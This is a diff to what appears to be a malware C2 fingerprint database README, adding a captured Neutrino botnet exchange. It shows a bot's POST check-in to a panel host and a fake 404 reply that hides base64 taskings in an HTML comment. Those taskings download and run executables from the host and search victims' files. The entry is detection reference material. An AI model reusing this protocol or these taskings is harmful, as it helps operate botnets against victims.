@@ -447,6 +447,36 @@ flag on "41 00 00 00 99" pattern in initial packet
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/netwire.png "Netwire 40")
 
+#### Neutrino
+~~~
+POST /panel/52/tasks.php HTTP/1.0
+Host: slipcentral.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0
+Content-type: application/x-www-form-urlencoded
+Cookie: auth=bc00595440e801f8a5d2a2ad13b9791b
+Content-length: 180
+
+_wv=Y21kJjkwMDU5YzM3LTEzMjAtNDFhNC1iNThkLTJiNzVhOTg1MGQyZiZZV1J0YVc0Z09pQlZVMFZTTFZCRElEb2dWVk5GVWkxUVF3JTNEJTNEJldpbmRvd3MlMjA3JTIwKDMyLWJpdCkmMCZOJTJGQSY1LjEmMDguMTAuMjAxOSZOT05FHTTP/1.0 404 Not Found
+Connection: close
+X-Powered-By: PHP/5.6.40
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1251
+Date: Tue, 08 Oct 2019 00:52:53 GMT
+Server: LiteSpeed
+Vary: User-Agent
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /panel/52/tasks.php was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
+</body></html><!---MTU3MDI2MTQzNjkyODM2MyNyYXRlIDUjMTQ2MzAyMDA2NjUxNjE2OSNzY3JlZW5zaG90IzE0NjkxMDAwOTY4ODIwMDAjYm90a2lsbGVyIzE1NzAyNjMxNzk5MTUwMDAjTE9BREVSIGh0dHA6Ly9zbGlwY2VudHJhbC5jb20vcGFuZWwvNTIvdXBsb2FkL2twKDEpLmV4ZSBydW4jMTU3MDI1OTIyNTI4Njg5NCNGSU5EICUyQWRhdCUyQSMxNTcwMjYyMjA3Njc0NDQzI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MzE4ODkxMzkyOCNETlMgaHR0cDovL3NsaXBjZW50cmFsLmNvbS9wYW5lbC81Mi91cGxvYWQveHNsYXllciBjdnYgY2hlY2tlci5leGUgcnVuIzE1NzAyNjM3NzM3MjkxNjUjRklORCB0eHQjMTU3MDI2Mzc4MDYwOTkwNCNGSU5EIGpwZyMxNTcwMjYyMjA3ODg2MjAwI0NNRC1SZXN1bHQgaXBjb25maWcjMTU3MDI2MjMwNDMzOTAxNyNGSU5EIHdlYmluamVjdHMudHh0IzE1NzAyNjI1MTM0ODkxMDYjRklORCAlNUMlMjZxdW90JTNCdHh0JTVDJTI2cXVvdCUzQiMxNTcwMjYzMzQxNzU4MzE3I0xPQURFUiBodHRwOi8vc2xpcGNlbnRyYWwuY29tL3BhbmVsLzUyL3VwbG9hZC96ZXVzIGNhbmFkYS5leGUgcnVuIzE1NzAyNzM4OTk0MTc4NTMjQ01ELVJlc3VsdCBwc2xpc3QjMTU3MDI3Mjk4MTIxNDQ0NSNDTUQtUmVzdWx0IHBzbGlzdCMxNTcwMjYzNzI2NjY5NzcyI0NNRC1SZXN1bHQgdGFza2xpc3Qj--->
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/neutrno.png "Neutrino")
+
 #### Orcus RAT
 Machine name is SNI
 ~~~
